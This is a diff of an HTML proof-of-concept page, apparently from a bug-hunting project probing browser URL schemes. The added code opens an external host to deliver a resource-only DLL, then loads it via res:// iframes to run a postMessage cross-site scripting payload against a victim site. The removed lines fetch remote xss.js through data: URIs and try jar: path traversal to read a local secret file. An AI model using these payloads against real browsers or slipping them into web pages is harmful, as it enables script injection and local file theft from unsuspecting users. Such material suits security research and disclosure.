@@ -1,52 +1,60 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-	<title></title>
+	<title>
+
+	</title>
 </head>
 <body>
+
+<iframe src="res://C:\Windows\evil.google.com/XSS" height="400" width="400"></iframe>
+
+
+
+
+</iframe>
+<!--
+<iframe src="res://C:\Users\1307\Desktop\Windows.System32.google.com/101" height="400" width="400"></iframe>
+<iframe src="res://C:\Temp\Dll4.dll" height="400" width="400"></iframe>
+<iframe src="res://Dll4.dll/101" height="400" width="400"></iframe>
+
+
+
+
+Downloads\Dll4.dll
+
+
+<script type="text/javascript">
+// Assuming that the victim accepts to download the file, no need to open it.
+// This line could be altered with forcing download vulnerability if there is one.
+// all of these can be automated smoothly if tehre is drive-by download on the vulnerable browser.
+window.open('https://bughunt1307.herokuapp.com/evil.google.com');
+
+// evil.google.com is resource only DLL file with a HTML resource containing the following code:
+/*
+<script>
+var popup = window.open('https://whatever.victim.com/', 'XSS');
+function post(){popup.postMessage("XSS payload goes here","*")}
+setTimeout(post, 3000); 
+<\/script> 
+*/
+
+// ref: https://docs.microsoft.com/en-us/cpp/build/creating-a-resource-only-dll?view=vs-2019
+
+var ifr =  document.createElement('iframe');
+ifr.src = 'res://C:\u005c\u005cUsers\u005c'+window.location.href.split('/')[5]+'\u005cDownloads\u005cevil.google.com/XSS'
+function appendIfr(argument) {
+	document.body.appendChild(ifr)
+}
+window.setTimeout(appendIfr, 4000);
+
+</script>
+
  
 
-<iframe src="data:text/html,<script src='http://bughunt1307.herokuapp.com/xss.js'></script>"></iframe>
-<embed type="text/html" src="data:text/html,<script src='http://bughunt1307.herokuapp.com/xss.js'></script>" width="250" height="200">
-<object type="text/html" data="data:text/html,<script src='http://bughunt1307.herokuapp.com/xss.js'></script>" width="250" height="200">
-</object>
-	       
-<!-- 	
-<iframe src="quic-transport://evil.com/"></iframe>
+<iframe src="res://C:\Windows\System32\mshtml.dll/PERFWIDGET.HTML" height="400" width="400"></iframe> 
 
-​<iframe src="dat://google.com"></iframe>
-​
-<iframe src="ms-get-started://collection/?id=windows-collection&tipsetid=whats-new&tipid=pauseupdates"></iframe>
-
-<iframe src="dweb://google.com"></iframe>
-​
-<iframe src="ftp://google.com"></iframe>
-​
-<iframe src="http://google.com"></iframe>
-​
-<iframe src="javascript:"></iframe>
-​
-<iframe src="ipfs://google.com"></iframe>
-​
-<iframe src="ipns://google.com"></iframe>
-​
-<iframe src="resource://google.com"></iframe>
-
-​<iframe src="res://C:%5CUsers%5C1307%5CDesktop%5CRES-Project%5Cevil.google.com/XSS"></iframe>
-
-<iframe src="ms-windows-store:Assoc?protocol=dweb"></iframe>
-
-<iframe src="jar:file:///C:/Program Files/Mozilla Firefox/browser/omni.ja!/../../../../../../../secret.txt"></iframe>
-
-<script src="jar:file:///C:/Program Files/Mozilla Firefox/browser/omni.ja!/../../../../../../../secret.txt"></script> 
-
-<iframe src="ssb://google.com"></iframe>
-​
-<iframe src="ssh://google.com"></iframe>
-​
-<iframe src="ws://google.com"></iframe>
-​
-<iframe src="wss://google.com"></iframe>
 
 -->
 
